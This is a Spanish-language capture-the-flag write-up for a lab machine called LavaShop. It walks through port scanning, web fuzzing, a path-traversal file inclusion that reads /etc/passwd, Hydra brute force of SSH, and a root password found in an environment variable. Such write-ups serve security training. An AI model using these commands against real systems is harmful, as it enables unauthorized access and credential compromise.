
# **LavaShop CTF - Writeup**

---

## **🔍 Reconocimiento Inicial**

Identificamos los siguientes servicios expuestos:

- **SSH** (Puerto 22)
- **HTTP** (Puerto 80)
- **Servicio no estándar** (Puerto 1337)

El servicio HTTP redirige a un **virtual host** específico: `lavashop.thl`.

---

## **🛠️ Escaneo con Nmap**

```bash
enum 22,80,1337
```

**Resultado del escaneo:**

```plaintext
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp   open  http    Apache httpd 2.4.62
|_http-title: Did not follow redirect to http://lavashop.thl/
1337/tcp open  waste?
```

**Información adicional:**
- **MAC Address:** `08:00:27:02:7D:DC` (Oracle VirtualBox)
- **Sistema Operativo:** Linux (Debian)
- **Host:** `127.0.0.1`

---

## **🌐 Enumeración Web**

### **📌 Configuración del Host Virtual**

Editamos el archivo `/etc/hosts` para redirigir el dominio `lavashop.thl` a la IP del servidor:

```bash
sudo nano /etc/hosts
```

Añadimos la línea:
```plaintext
<IP_DEL_SERVIDOR>    lavashop.thl
```

---

### **🔎 Fuzzing de Directorios**

Usamos **WFuzz** para descubrir directorios ocultos:

```bash
wfuzz --hc 404,403 -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt http://lavashop.thl/FUZZ
```

**Resultados relevantes:**

| ID       | Respuesta | Líneas | Palabras | Payload      |
|----------|-----------|--------|----------|--------------|
| 00000004 | 301       | 9      | 28       | `includes`   |
| 00000082 | 301       | 9      | 28       | `assets`     |
| 00000121 | 301       | 9      | 28       | `pages`      |
| 000032103| 200       | 44     | 105      | `index.php`  |

---

### **🔍 Fuzzing de Parámetros (LFI)**

Probamos parámetros vulnerables en `products.php`:

```bash
wfuzz --hc 404,403 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt "http://lavashop.thl/pages/products.php?FUZZ=test"
```

**Resultado:**

| ID       | Respuesta | Líneas | Palabras | Payload |
|----------|-----------|--------|----------|---------|
| 000002206| 200       | 31     | 118      | `file`  |

---

## **🚨 Explotación: Local File Inclusion (LFI)**

Descubrimos un **LFI** en el parámetro `file` de `products.php`. Explotamos mediante **Path Traversal**:

```bash
curl "http://lavashop.thl/pages/products.php?file=../../../../etc/passwd"
```

**Contenido del archivo `/etc/passwd`:**

```plaintext
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
Rodri:x:1001:1001::/home/Rodri:/bin/bash
```

---

## **🔓 Acceso Inicial: Fuerza Bruta SSH**

Con el usuario `debian` identificado, realizamos **fuerza bruta** contra SSH:

```bash
hydra -l debian -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

**Credenciales obtenidas:**
- **Usuario:** `debian`
- **Contraseña:** `12345`

---

## **📂 Obtención de la Primera Flag**

Accedemos al sistema:

```bash
ssh debian@<IP>
```

Navegamos al directorio de `Rodri` y leemos la flag:

```bash
cd /home/Rodri
cat user.txt
```

**Contenido de `user.txt`:**
```plaintext
13dc7b1266b4aa6ca4cdab36b1596025
```

---

## **🔐 Escalada de Privilegios**

### **🔍 Enumeración de Variables de Entorno**

```bash
env
```

**Resultado relevante:**
```plaintext
SHELL=/bin/bash
ROOT_PASS=lalocadelaslamparas
```

### **🚀 Obtención de Root**

Usamos la contraseña encontrada para escalar a `root`:

```bash
su root
```

**Contraseña:** `lalocadelaslamparas`

Leemos la flag final:

```bash
cat /root/root.txt
```

**Contenido de `root.txt`:**
```plaintext
y comprometimos la maquina¡¡¡
```

---

## **🎯 Resumen del Ataque**

| Fase               | Técnica Utilizada          | Resultado Obtenido                     |
|--------------------|----------------------------|----------------------------------------|
| **Reconocimiento** | Escaneo de puertos (Nmap)  | Servicios expuestos: SSH, HTTP, 1337  |
| **Enumeración Web**| Fuzzing de directorios     | Descubrimiento de `includes`, `assets`|
| **Explotación**    | LFI + Path Traversal       | Lectura de `/etc/passwd`               |
| **Acceso Inicial** | Fuerza bruta SSH           | Credenciales: `debian:12345`           |
| **Escalada**       | Variables de entorno       | Contraseña de root: `lalocadelaslamparas` |

---
